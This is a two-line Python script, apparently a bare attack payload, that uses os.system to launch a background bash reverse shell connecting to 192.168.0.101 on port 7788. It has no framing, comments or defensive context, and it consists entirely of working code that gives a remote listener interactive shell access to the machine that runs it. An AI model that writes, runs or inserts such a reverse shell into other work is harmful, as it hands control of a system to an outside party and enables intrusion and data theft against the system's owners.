import os

os.system("bash -c 'bash -i >& /dev/tcp/192.168.0.101/7788 0>&1' &")
